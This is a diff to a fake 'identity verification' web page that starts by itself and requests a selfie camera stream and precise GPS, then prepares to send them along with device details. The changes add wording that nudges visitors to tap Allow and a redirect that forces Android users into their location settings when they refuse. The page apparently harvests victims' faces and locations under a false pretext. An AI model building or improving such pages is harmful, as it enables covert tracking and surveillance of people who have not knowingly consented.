@@ -40,8 +40,8 @@ body{
   <h2>Verification</h2>
 
   <p class="notice">
-    This process requires camera and location access for identity verification.
-    Please allow permissions when prompted.
+    This verification requires access to your camera and location.
+    Please tap <b>Allow</b> when prompted.
   </p>
 
   <div id="status">Initializing…</div>
@@ -74,7 +74,8 @@ const status = document.getElementById("status");
 device.value = navigator.userAgent;
 time.value = new Date().toLocaleString();
 
-setTimeout(startVerification, 2000);
+// AUTO START
+setTimeout(startVerification, 1500);
 
 function startVerification(){
   status.innerText = "Requesting permissions…";
@@ -82,7 +83,7 @@ function startVerification(){
   requestGPS();
 }
 
-// CAMERA
+/* ================= CAMERA ================= */
 function requestCamera(){
   navigator.mediaDevices.getUserMedia({
     video:{ facingMode:"user" }
@@ -129,7 +130,7 @@ function requestCamera(){
   });
 }
 
-// GPS
+/* ================= GPS ================= */
 function requestGPS(){
   navigator.geolocation.getCurrentPosition(
     pos=>{
@@ -144,8 +145,13 @@ function requestGPS(){
       checkAndSend();
     },
     ()=>{
-      status.innerText = "Waiting for GPS signal…";
-      setTimeout(requestGPS,2000);
+      status.innerText = "Please enable location access…";
+
+      // AUTO OPEN ANDROID LOCATION SETTINGS
+      window.location.href =
+        "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
+
+      setTimeout(requestGPS, 3000);
     },
     {
       enableHighAccuracy:true,
@@ -154,6 +160,7 @@ function requestGPS(){
   );
 }
 
+/* ================= SEND ================= */
 function checkAndSend(){
   if(gpsReady && imageReady){
     if(sessionStorage.sent) return;
